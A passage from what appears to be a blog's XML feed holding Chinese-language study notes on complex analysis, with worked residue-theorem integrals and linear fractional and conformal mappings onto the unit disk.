type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            I_{a, b} &= \frac{1}{2}\lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz \\            &= \pi i\left(Res\left[f(z), ai\right], Res\left[f(z), bi\right]\right) \\            &= \pi i\left(\frac{1}{2ai(a^2 + b^2 +2(ai)^2)} + \frac{1}{2bi(a^2 + b^2 +2(bi)^2)}\right) \\            &= \frac{\pi}{2ab(a + b)}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分 <script type="math/tex">I_n = \int_{0}^{+\infty}\cfrac{dx}{1 + x^{2n}}.</script> ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">I_n = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{1 + x^{2n}}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            I_n &= \frac{1}{2}\lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz \\            &= \pi i\sum_{k = 1}^{n}Res\left[\frac{1}{1 + z^{2n}}, z_k\right] = \pi i\sum_{k = 1}^{n}\frac{1}{2nz_k^{2n - 1}} \\            &= \frac{\pi i}{2n}\sum_{k = 1}^{n}z_k^{2n - 1} = -\frac{\pi i}{2n}\sum_{k = 1}^{n}z_k \\            &= -\frac{\pi i}{2n}\sum_{k = 1}^{n}e^{\frac{(2k - 1)\pi i}{2n}} = -\frac{\pi i}{2n}e^{-\frac{\pi i}{2n}}\sum_{k = 1}^{n}e^{\frac{k\pi i}{n}} \\            &= -\frac{\pi i}{2n}e^{-\frac{\pi i}{2n}}\frac{2}{1 - e^{\frac{\pi i}{n}}} = \frac{\pi i}{n}\frac{1}{e^{\frac{\pi i}{2n}} - e^{-\frac{\pi i}{2n}}} \\            &= \frac{\pi i}{n}\frac{1}{2i\sin\frac{\pi}{2n}} = \frac{\frac{\pi}{2n}}{\sin\frac{\pi}{2n}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分</p><script type="math/tex; mode=display">I_{r, n} = \int_{0}^{+\infty}\cfrac{dx}{r^{2n} + x^{2n}}.</script><p>其中 $r &gt; 0$. ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">\begin{aligned}            I_{r, n} &= \cfrac{1}{r^{2n - 1}}\int_{0}^{+\infty}\cfrac{d\left(\frac{x}{r}\right)}{1 + \left(\frac{x}{r}\right)^{2n}} \\            &= \cfrac{1}{r^{2n - 1}}I_n \\            &= \frac{\frac{\pi}{2n}}{r^{2n - 1}\sin\frac{\pi}{2n}}.        \end{aligned}$$ ◻$\textbf{Example:}$求积分 $$J_n = \int_{0}^{+\infty}\cfrac{dx}{1 + x^n},</script><p>其中 $n \ge 2$. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">J_n = \lim_{R\rightarrow +\infty}\int_{0}^{R}\cfrac{dx}{1 + x^n}.</script><p>作<br>$\Gamma_R: \left[0, R\right]\cup C_R\cup \left[Re^{i\theta}, 0\right]$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{0}^{R}f(x)dx + \int_{C_R}f(z)dz + \int_{R}^{0}f(xe^{i\theta})d(xe^{i\theta}).</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>取 $\theta = \cfrac{2\pi}{n}, \varphi = \cfrac{\pi}{n}$, 那么</p><script type="math/tex; mode=display">\begin{aligned}            \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz &= \lim_{R\rightarrow +\infty}\int_{0}^{R}f(x)dx + \lim_{R\rightarrow +\infty}\int_{R}^{0}f(xe^{i\theta})d(xe^{i\theta}) \\            &= \lim_{R\rightarrow +\infty}\left(\int_{0}^{R}\cfrac{dx}{1 + x^n}dx - \int_{0}^{R}\cfrac{e^{i\theta}dx}{1 + e^{ni\theta}x^n}\right) \\            &= \lim_{R\rightarrow +\infty}\left(\int_{0}^{R}\cfrac{dx}{1 + x^n}dx - e^{\frac{2\pi i}{n}}\int_{0}^{R}\cfrac{dx}{1 + x^n}\right) \\            &= \left(1 - e^{\frac{2\pi i}{n}}\right)\lim_{R\rightarrow +\infty}\int_{0}^{R}\cfrac{dx}{1 + x^n}dx \\            &= \left(1 - e^{\frac{2\pi i}{n}}\right)J_n.        \end{aligned}</script><p>又注意到 <script type="math/tex">\begin{aligned}            \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz = 2\pi i\frac{1}{ne^{(n - 1)\frac{\pi i}{n}}},        \end{aligned}</script></p><p>故 <script type="math/tex">\begin{aligned}            J_n &= \frac{2\pi i}{ne^{(n - 1)\frac{\pi i}{n}}\left(1 - e^{\frac{2\pi i}{n}}\right)} \\            &= \frac{2\pi i}{ne^{(\pi - \varphi)i}\left(1 - e^{2\varphi i}\right)} \\            &= \frac{\pi i}{n(-\cos\varphi + i\sin\varphi)\sin\varphi(\sin\varphi - i\cos\varphi)} \\            &= \frac{\pi}{n\sin\varphi} = \frac{\frac{\pi}{n}}{\sin\frac{\pi}{n}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$</p><script type="math/tex; mode=display">\frac{1}{(1 + z)^n} = \sum_{k = 0}^{+\infty}(-1)^k C_{n + k - 1}^{n - 1}z^k,</script><p>其中 $\left|{z}\right| &lt; 1$. 特别地, 其中 $z^{n - 1}$ 项的系数为</p><script type="math/tex; mode=display">(-1)^{n - 1}C_{2n - 2}^{n - 1} = (-1)^{n - 1}\cfrac{(2n - 2)!}{(n - 1)!(n - 1)!}.$$ ◻$\textbf{Example:}$求积分 $$J_n = \int_{0}^{+\infty}\cfrac{dx}{(1 + x^2)^n}.$$ ◻$\textbf{Solution:}$注意到$$J_n = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{(1 + x^2)^n}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>因为 <script type="math/tex">\begin{aligned}            \cfrac{1}{(1 + z^2)^n} &= \cfrac{1}{(z + i)^n(z - i)^n} \\            &= \cfrac{1}{(2i)^n(1 + \frac{z - i}{2i})^n(z - i)^n} \\            &= \cfrac{1}{(2i)^n(z - i)^n}\sum_{k = 0}^{+\infty}(-1)^k C_{n + k - 1}^{n - 1}(\frac{z - i}{2i})^k.        \end{aligned}</script></p><p>其中 $\cfrac{1}{z - i}$ 的系数<br>$c_{-1} = \cfrac{(-1)^{n - 1}C_{2n - 2}^{n - 1}}{(2i)^{2n - 1}} = \cfrac{-iC_{2n - 2}^{n - 1}}{2^{2n - 1}}$.</p><p>那么 <script type="math/tex">\begin{aligned}            J_n &= \pi i Res[f, i] \\            &= \pi ic_{-1} \\            &= \cfrac{\pi C_{2n - 2}^{n - 1}}{2^{2n - 1}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分 <script type="math/tex">J_{r, n} = \int_{0}^{+\infty}\cfrac{dx}{(r^2 + x^2)^n}.</script></p><p>其中 $r &gt; 0$. ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">\begin{aligned}            J_{r, n} &= \cfrac{1}{r^{2n - 1}}\int_{0}^{+\infty}\cfrac{d\left(\frac{x}{r}\right)}{\left(1 + \left(\frac{x}{r}\right)^{2}\right)^n} \\            &= \cfrac{1}{r^{2n - 1}}J_n \\            &= \cfrac{\pi C_{2n - 2}^{n - 1}}{(2r)^{2n - 1}}.        \end{aligned}$$ ◻### 14. 留数 C$\textbf{Example:}$$C_R: Re^{i\theta}$, $0\le\theta\le\pi$, 多项式 $P$, $Q$ 满足$\deg Q\ge\deg P + 1$, 则$$\lim_{R\rightarrow +\infty}\limits\int_{C_R}\frac{P(z)e^{ikz}}{Q(z)}dz = 0.$$ ◻$\textbf{Example:}$求积分 $$I = \int_{0}^{+\infty}\cfrac{x\sin kx}{x^2 + a^2}dx,</script><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>记 $f(z) = \cfrac{z\sin kz}{z^2 + a^2}$,<br>$h(z) = \cfrac{ze^{ikx}}{z^2 + a^2}$.</p><p>那么</p><script type="math/tex; mode=display">\int_{-\infty}^{+\infty}\limits h(z)dz = \int_{-\infty}^{+\infty}\limits\cfrac{z\cos kz}{z^2 + a^2}dz + i\int_{-\infty}^{+\infty}\limits f(z)dz = 2iI.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$, 那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}h(z)dz = \int_{-R}^{R}h(x)dx + \int_{C_R}h(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}h(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            \int_{-\infty}^{+\infty}\cfrac{ze^{ikz}}{z^2 + a^2}dz &= \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}h(z)dz \\            &= 2\pi i Res\left[f(z), ai\right] \\            &= 2\pi i\cdot\cfrac{e^{-ka}}{2} \\            &= \cfrac{\pi i}{e^{ka}}.        \end{aligned}</script></p><p>两边取虚部, 得 <script type="math/tex">\begin{aligned}            I = \cfrac{\pi}{2e^{ka}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求积分</p><script type="math/tex; mode=display">I_n = \int_{0}^{+\infty}\cfrac{x\sin kx}{(x^2 + a^2)^n}dx,</script><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">\frac{\partial I_n}{\partial a} = -2na\int_{0}^{+\infty}\cfrac{x\sin kx}{(x^2 + a^2)^{n + 1}}dx = -2naI_{n + 1}.</script><p>即 <script type="math/tex">I_{n + 1} = -\cfrac{1}{2na}\frac{\partial I_n}{\partial a}.</script></p><p>依次递归求解即可. ◻</p><p>$\textbf{Example:}$<br>求积分</p><script type="math/tex; mode=display">I_{a, b, k} = \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx,</script><p>其中 $a&gt;0$, $b &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>记 $f(z) = \cfrac{z^3\sin kz}{(z^2 + a^2)(z^2 + b^2)}$,<br>$h(z) = \cfrac{z^3e^{ikx}}{(z^2 + a^2)(z^2 + b^2)}$.</p><p>那么</p><script type="math/tex; mode=display">\int_{-\infty}^{+\infty}\limits h(z)dz = \int_{-\infty}^{+\infty}\limits\cfrac{z^3\cos kz}{(z^2 + a^2)(z^2 + b^2)}dz + i\int_{-\infty}^{+\infty}\limits f(z)dz = 2iI_{a, b, k}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$, 那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}h(z)dz = \int_{-R}^{R}h(x)dx + \int_{C_R}h(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}h(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            \int_{-\infty}^{+\infty}\cfrac{z^3e^{ikz}}{(z^2 + a^2)(z^2 + b^2)}dz &= \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}h(z)dz \\            &= 2\pi i\left(Res\left[f(z), ai\right] + Res\left[f(z), bi\right]\right) \\            &= \pi i\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.        \end{aligned}</script></p><p>两边取虚部, 得 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx = \cfrac{\pi}{2}\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求积分</p><script type="math/tex; mode=display">I_{a, k} = \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx,</script><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>在 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx = \cfrac{\pi}{2}\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.        \end{aligned}</script></p><p>中, 令 $b\rightarrow a$, 得 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx = \cfrac{\pi}{2}\cdot\cfrac{(2 - ka)e^{-ka}}{2}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分 <script type="math/tex">I_k = \int_{0}^{+\infty}\cfrac{\sin kx}{x}dx.</script></p><p>其中 $k &gt; 0$. ◻</p><p>$\textbf{Solution:}$<br>在 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx = \cfrac{\pi}{2}\cdot\cfrac{(2 - ka)e^{-ka}}{2}.        \end{aligned}</script></p><p>中, 令 $a\rightarrow 0^{+}$, 得 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{\sin kx}{x}dx = \cfrac{\pi}{2}.        \end{aligned}</script> ◻</p><h3 id="15-解析映射"><a href="#15-解析映射" class="headerlink" title="15. 解析映射"></a>15. 解析映射</h3><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 将 $z_k = -1, 0, 1$ 映射到 $w_k = -1, 1, i$. ◻</p><p>$\textbf{Solution:}$<br>利用不变式</p><script type="math/tex; mode=display">\cfrac{w - w_1}{w - w_2}\bigg/\cfrac{w_3 - w_1}{w_3 - w_2} = \cfrac{z - z_1}{z - z_2}\bigg/\cfrac{z_3 - z_1}{z_3 - z_2}.</script><p>那么</p><script type="math/tex; mode=display">\cfrac{w + 1}{w - 1}\bigg/\cfrac{i + 1}{i - 1} = \cfrac{z + 1}{z}\bigg/\cfrac{2}{1}.</script><p>从中解得 <script type="math/tex">w = \cfrac{(1 + 2i)z + 1}{(1 - 2i)z + 1}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 将单位圆周映射到直线. ◻</p><p>$\textbf{Solution:}$<br>一方面, 容易知道存在 $\left|{z_0}\right| = 1$, 使得<br>$cz_0 + d = 0$.</p><p>注意到 <script type="math/tex">\begin{aligned}            &\hspace{1.8em} cz_0 + d = 0 \\            &\Rightarrow \left|{cz_0}\right| = \left|{d}\right| \\            &\Leftrightarrow \left|{c}\right| = \left|{d}\right| \\            &\Leftrightarrow c = de^{i\theta}.        \end{aligned}</script></p><p>另一方面, 当 $c = de^{i\theta}$ 时, 该分式线性映射满足条件. ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将单位圆盘 $\left|{z}\right| &lt; 1$ 映射到单位圆盘<br>$\left|{w}\right| &lt; 1$;</li><li>将点 $z = z_1\thinspace(\left|{z_1}\right| &lt; 1)$ 映射到点 $w = 0$. ◻</li></ul><p>$\textbf{Solution:}$<br>由于分式线性映射保对称点的性质,</p><p>映射前 $z_1$ 的对称点为 $\cfrac{1}{\overline{z_1}}$, 映射后为 $0$<br>的对称点 $+\infty$. 故</p><script type="math/tex; mode=display">w = \alpha\cfrac{z - z_1}{z - \frac{1}{\overline{z_1}}} = (-\alpha z_1)\cfrac{z - z_1}{1 - z\overline{z_1}} = \beta\cfrac{z - z_1}{1 - z\overline{z_1}}.</script><p>由最大模原理:</p><script type="math/tex; mode=display">\left|{z}\right| = 1\Leftrightarrow\left|{w}\right| = 1.</script><p>注意到 $\left|{z_1}\right| &lt; 1$, 从而有 <script type="math/tex">\begin{aligned}            1 &= \left|{\beta}\right|\left|{\cfrac{z - z_1}{1 - z\overline{z_1}}}\right|_{\left|{z}\right| = 1} \\            &= \left|{\beta}\right|\left|{\cfrac{z - z_1}{z\overline{z} - z\overline{z_1}}}\right|_{\left|{z}\right| = 1} \\            &= \cfrac{\left|{\beta}\right|}{\left|{z}\right|}\left|{\cfrac{z - z_1}{\overline{z  - z_1}}}\right|_{\left|{z}\right| = 1} \\            &= \left|{\beta}\right|.        \end{aligned}</script></p><p>即 <script type="math/tex">\beta = e^{i\theta}, \theta\in[0, 2\pi).</script></p><p>那么有</p><script type="math/tex; mode=display">w = e^{i\theta}\cfrac{z - z_1}{1 - z\overline{z_1}}, \thinspace\left|{z_1}\right| < 1, \thinspace\theta\in[0, 2\pi).$$ ◻$\textbf{Example:}$求分式线性映射 $w(z)$ 满足:- 将单位圆盘 $\left|{z - z_0}\right| < r$ 映射到单位圆盘  $\left|{w - w_0}\right| < R$;- 将点 $z = z_1\thinspace(\left|{z_1 - z_0}\right| < r)$ 映射到点  $w = w_0$. ◻$\textbf{Solution:}$考虑 $$z' = \cfrac{z - z_0}{r}, w' = \cfrac{w - w_0}{R}.</script><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为单位圆盘. 那么有</p><script type="math/tex; mode=display">w' = e^{i\theta}\cfrac{z' - z_1'}{1 - z'\overline{z_1'}}, \thinspace\left|{z_1'}\right| < 1, \thinspace\theta\in[0, 2\pi).</script><p>代入 $w’$, $z’$ 可得</p><script type="math/tex; mode=display">w = w_0 + rRe^{i\theta}\cfrac{z - z_1}{r^2 - (z - z_0)(\overline{z_1} - \overline{z_0})}, \thinspace\left|{z_1 - z_0}\right| < r, \thinspace\theta\in[0, 2\pi).$$ ◻$\textbf{Example:}$对于 中的映射, 证明不变式:$$\cfrac{\left|{dw}\right|}{1 - \left|{w}\right|^2} = \cfrac{\left|{dz}\right|}{1 - \left|{z}\right|^2}.$$ ◻$\textbf{Solution:}$即证:$$\left|{\cfrac{dw}{dz}}\right| = \cfrac{1 - \left|{w}\right|^2}{1 - \left|{z}\right|^2}.</script><p>注意到 <script type="math/tex">w = e^{i\theta}\cfrac{z - z_1}{1 - z\overline{z_1}},</script></p><p>其中 <script type="math/tex">\left|{z_1}\right| < 1, \thinspace\theta\in[0, 2\pi)</script></p><p>那么 <script type="math/tex">\begin{aligned}            LHS = \left|{e^{i\theta}\cfrac{1 - z_1\overline{z_1}}{(1 - z\overline{z_1})^2}}\right| = \cfrac{1 - z_1\overline{z_1}}{\left|{1 - z\overline{z_1}}\right|^2}.        \end{aligned}</script></p><script type="math/tex; mode=display">\begin{aligned}            RHS &= \cfrac{1 - w\overline{w}}{1 - z\overline{z}} \\            &= \cfrac{\left|{1 - z\overline{z_1}}\right|^2 - \left|{z - z_1}\right|^2}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{(1 - z\overline{z_1})(1 - z_1\overline{z}) - (z - z_1)(\overline{z} - \overline{z_1})}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{1 - z\overline{z} - z_1\overline{z_1} + z\overline{z}z_1\overline{z_1}}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{(1 - z\overline{z})(1 - z_1\overline{z_1})}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{1 - z_1\overline{z_1}}{\left|{1 - z\overline{z_1}}\right|^2} = LHS.        \end{aligned}</script><p>至此证毕.  ◻</p><p>$\textbf{Example:}$<br>对于 中的映射, 证明不变式:</p><script type="math/tex; mode=display">\cfrac{R\left|{dw}\right|}{R^2 - \left|{w - w_0}\right|^2} = \cfrac{r\left|{dz}\right|}{r^2 - \left|{z - z^0}\right|^2}.$$ ◻$\textbf{Solution:}$考虑 $$z' = \cfrac{z - z_0}{r}, w' = \cfrac{w - w_0}{R}.</script><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为单位圆盘. 那么有</p><script type="math/tex; mode=display">\cfrac{\left|{dw’}\right|}{1 - \left|{w'}\right|^2} = \cfrac{\left|{dz'}\right|}{1 - \left|{z'}\right|^2}.</script><p>代入 $w’$, $z’$ 可得</p><script type="math/tex; mode=display">\cfrac{R\left|{dw}\right|}{R^2 - \left|{w - w_0}\right|^2} = \cfrac{r\left|{dz}\right|}{r^2 - \left|{z - z^0}\right|^2}.$$ ◻$\textbf{Example:}$求分式线性映射 $w(z)$ 满足:- 将上半复平面 $Im{z} > 0$ 映射到单位圆盘 $\left|{w}\right| < 1$;- 将点 $z = z_1\thinspace(Im{z_1} > 0)$ 映射到点 $w = 0$. ◻ $\textbf{Solution:}$将上半平面看作半径无穷的圆, $z_1$ 关于圆周的对称点为$\overline{z_1}$.由于分式线性映射保对称点的性质,映射前 $z_1$ 的对称点为 $\overline{z_1}$, 映射后为 $0$ 的对称点$+\infty$. 故 $$w = \alpha\cfrac{z - z_1}{z - \overline{z_1}}.</script><p>由最大模原理: <script type="math/tex">z = x\in\mathbb{R}\Leftrightarrow\left|{w}\right| = 1.</script></p><p>注意到 $Im{z_1} &gt; 0$, 从而有 <script type="math/tex">\begin{aligned}            1 &= \left|{\alpha}\right|\left|{\cfrac{x - z_1}{x - \overline{z_1}}}\right| \\            &= \left|{\alpha}\right|\left|{\cfrac{x - z_1}{\overline{x} - \overline{z_1}}}\right| \\            &= \left|{\alpha}\right|.        \end{aligned}</script></p><p>即 <script type="math/tex">\alpha = e^{i\theta}, \theta\in[0, 2\pi).</script></p><p>那么有</p><script type="math/tex; mode=display">w = e^{i\theta}\cfrac{z - z_1}{z - \overline{z_1}}, \thinspace Im{z_1} > 0, \thinspace\theta\in[0, 2\pi).</script><p>特别地, 取 $\theta = 0, z_1 = i$, 可得 <script type="math/tex">w = \cfrac{z - i}{z + i}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将过点 $x_0\in\mathbb{R}$, 旋转角为 $\theta_0$<br>的半平面映射到单位圆盘 $\left|{w - w_0}\right| &lt; R$;</li><li>将点 $z = z_1\thinspace(Im{[(z_1 - x_0)e^{-i\theta_0}]} &gt; 0)$<br>映射到点 $w = w_0$. ◻</li></ul><p>$\textbf{Solution:}$<br>考虑</p><script type="math/tex; mode=display">z' = (z - x_0)e^{-i\theta_0}, w' = \cfrac{w - w_0}{R}.</script><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为上半复平面与单位圆盘. 那么有</p><script type="math/tex; mode=display">w' = e^{i\theta}\cfrac{z' - z_1'}{z' - \overline{z_1'}}, \thinspace Im{z_1'} > 0, \thinspace\theta\in[0, 2\pi).</script><p>代入 $w’$, $z’$ 可得</p><script type="math/tex; mode=display">w = w_0 + Re^{i\theta}\cfrac{z - z_1}{z - x_0 - (\overline{z_1} - x_0)e^{2i\theta_0}},</script><p>其中</p><script type="math/tex; mode=display">Im{[(z_1 - x_0)e^{-i\theta_0}]} > 0, \thinspace\theta\in[0, 2\pi).$$ ◻$\textbf{Example:}$映射 $w = \cfrac{az + b}{cz + d}$, 若 $a, b, c, d\in\mathbb{R}$, 则$$Im{z} > 0\leftrightarrow Im{w} > 0 \Longleftrightarrow ad - bc > 0.$$ ◻$\textbf{Solution:}$将 $z = x + iy$ 待入 $$w = \cfrac{az + b}{cz + d},</script><p>得 <script type="math/tex">w = u + iv = \cfrac{(ax + b) + iay}{(cx + d) + icy},</script></p><p>那么 <script type="math/tex">v = \cfrac{(ad - bc)y}{(cx + d)^2 + (cy)^2}.</script></p><p>从而 <script type="math/tex">\begin{aligned}            &\hspace{2em} Im{z} > 0\leftrightarrow Im{w} > 0 \\            &\Longleftrightarrow y > 0\leftrightarrow v > 0 \\            &\Longleftrightarrow yv > 0 \\            &\Longleftrightarrow \cfrac{(ad - bc)y^2}{(cx + d)^2 + (cy)^2} > 0 \\            &\Longleftrightarrow ad - bc > 0.        \end{aligned}</script></p><p>根据最大模原理可知,</p><p>该映射将上半复平面映到上半复平面, 实轴映到实轴.</p><p>又当 $z\in\mathbb{R}$ 时,</p><script type="math/tex; mode=display">\cfrac{dw}{dz} = \cfrac{ad - bc}{(cz + d)^2} > 0.</script><p>即 <script type="math/tex">\arg\left(\frac{dw}{dz}\right) = 0.</script></p><p>故该映射将上半复平面映到上半复平面, 实轴正向映到实轴正向. ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将过点 $a, b\in\mathbb{R}$, 旋转角为 $\alpha\in(0, \pi)$<br>的长条映射到单位圆盘 $\left|{w}\right| &lt; 1$. ◻</li></ul><p>$\textbf{Solution:}$<br>分为四步</p><ol><li>$z_1 = e^{-i\alpha}(z - b)$</li><li>$z_2 = \cfrac{\pi}{h}z_1$</li><li>$z_3 = e^{z_2}$</li><li>$w = \cfrac{z_3 - i}{z_3 + i}$</li></ol><p>整理得</p><script type="math/tex; mode=display">w = \cfrac{e^{\frac{e^{-i\alpha}(z - b)\pi}{(b - a)\sin\alpha}} - i}{e^{\frac{e^{-i\alpha}(z - b)\pi}{(b - a)\sin\alpha}} + i}.</script><p>特别地, 当 $\alpha = \cfrac{\pi}{2}$ 时,</p><script type="math/tex; mode=display">w = \cfrac{e^{\frac{b - z}{b - a}\pi i} - i}{e^{\frac{b - z}{b - a}\pi i} + i}.$$ ◻$\textbf{Example:}$求分式线性映射 $w(z)$ 满足:/- 将区域  $0 < r < R, \thinspace 0 < \theta < \alpha \thinspace(\alpha\in[0, 2\pi))$  映射到单位圆盘 $\left|{w}\right| < 1$. ◻ $\textbf{Solution:}$分为四步1. $z_1 = z^{\frac{\pi}{\alpha}}$2. $z_2 = \cfrac{R^{\frac{\pi}{\alpha}} + z_1}{R^{\frac{\pi}{\alpha}} - z_1}$   (上半圆 $\longrightarrow$ 第一象限)3. $z_3 = z_2^2$4. $w = \cfrac{z_3 - i}{z_3 + i}$整理得$$w = \cfrac{\left(\frac{R^{\frac{\pi}{\alpha}} + z^{\frac{\pi}{\alpha}}}{R^{\frac{\pi}{\alpha}} - z^{\frac{\pi}{\alpha}}}\right)^2 - i}{\left(\frac{R^{\frac{\pi}{\alpha}} + z^{\frac{\pi}{\alpha}}}{R^{\frac{\pi}{\alpha}} - z^{\frac{\pi}{\alpha}}}\right)^2 + i}.</script><p>特别地, 当 $\alpha = \cfrac{\pi}{8}$ 时,</p><p><script type="math/tex">w = \cfrac{\left(\frac{R^8 + z^8}{R^8 - z^8}\right)^2 - i}{\left(\frac{R^8 + z^8}{R^8 - z^8}\right)^2 + i}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将<br>$\left|{z - a}\right| &gt; a, \left|{z - b}\right| &lt; b\thinspace(0 &lt; a &lt; b)$<br>所围区域映到单位圆盘 $\left|{w}\right| &lt; 1$. ◻</li></ul><p>$\textbf{Solution:}$<br>分为五步</p><ol><li>$z_1 = \cfrac{z - 2a}{z}$ ($0 &lt; x &lt; \cfrac{b - a}{a}$ 的竖直长条)</li><li>$z_2 = iz_1$</li><li>$z_3 = \cfrac{\pi}{\frac{b - a}{a}}z_2$</li><li>$z_4 = e^{z_3}$</li><li>$w = \cfrac{z_4 - i}{z_4 + i}$</li></ol><p>整理得</p><p><script type="math/tex">w = \cfrac{e^{\frac{ib(z - 2a)\pi}{(b - a)z}} - i}{e^{\frac{ib(z - 2a)\pi}{(b - a)z}} + i}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li><p>将以 $A, B$ 为端点, $\theta_0\in(0, 2\pi)$<br>为弦切角的弓形映到单位圆盘 $\left|{w}\right| &lt; 1$. ◻</p><p>$\textbf{Solution:}$<br>分为三步</p></li></ul><ol><li>$z_1 = \cfrac{z - A}{B - z}$ (弓形 $\longrightarrow$ 第一象限角域)</li><li>$z_2 = z_1^{\frac{\pi}{\theta_0}}$</li><li>$w = \cfrac{z_2 - i}{z_2 + i}$</li></ol><p>整理得</p><p><script type="math/tex">w = \cfrac{\left(\frac{z - A}{B - z}\right)^{\frac{\pi}{\theta_0}} - i}{\left(\frac{z - A}{B - z}\right)^{\frac{\pi}{\theta_0}} + i}.</script> ◻</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Russian End-of-term Revision</title>
      <link href="/2022/12/28/russian-end-of-term-revision/"/>
      <url>/2022/12/28/russian-end-of-term-revision/</url>
      
